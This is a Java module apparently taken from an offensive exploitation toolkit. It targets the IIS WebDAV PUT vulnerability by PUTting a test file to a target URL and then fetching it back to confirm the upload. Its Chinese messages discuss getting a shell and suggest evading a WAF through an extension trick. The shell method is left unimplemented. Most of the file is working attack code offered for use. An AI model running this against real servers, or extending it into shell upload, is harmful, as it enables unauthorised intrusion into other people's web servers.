package Exp.middleware.IIS;

import Utilss.HttpTools;
import Utilss.Response;
import Utilss.shell;
import core.Exploitlnterface;
import javafx.scene.control.TextArea;

import java.util.HashMap;

public class iis_put_rce implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea) {
        Boolean att = att(url, textArea, shell.Testpath, "/nishizhu.txt");
        return att;
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return null;
    }

    private Boolean att(String url, TextArea textArea, String filePath, String uri) {
        HashMap<String, String> head = new HashMap<>();
        head.put("Content-Type", "application/octet-stream");
        Response put = HttpTools.put(url + uri, shell.readFile(filePath), head, "utf-8");
        if (put.getCode() == 201 || put.getCode() == 200) {
            Response response = HttpTools.get(url + uri, new HashMap<String, String>(), "utf-8");
            if (response.getText().contains("9df37afc77bdd582d90aefaf4e35c63e")) {
                textArea.appendText("\n 漏洞存在 测试文件地址为 " + url + "/nishizhu.txt");
                textArea.appendText("\n 这个洞暂时没办法直接getshell  复现move方法被waf拦截时可考虑后缀绕过");
                textArea.appendText("\n Java暂不支持MOVE方法  没找到什么好的解决办法(有办法的可以找我！)");
                return true;
            } else {
                textArea.appendText("\n iis_put_rce - 漏洞不存在 (出现误报请联系作者)");
                return false;
            }


        } else {
            textArea.appendText("\n iis_put_rce - 漏洞不存在 (出现误报请联系作者)");
            return false;
        }
    }
}
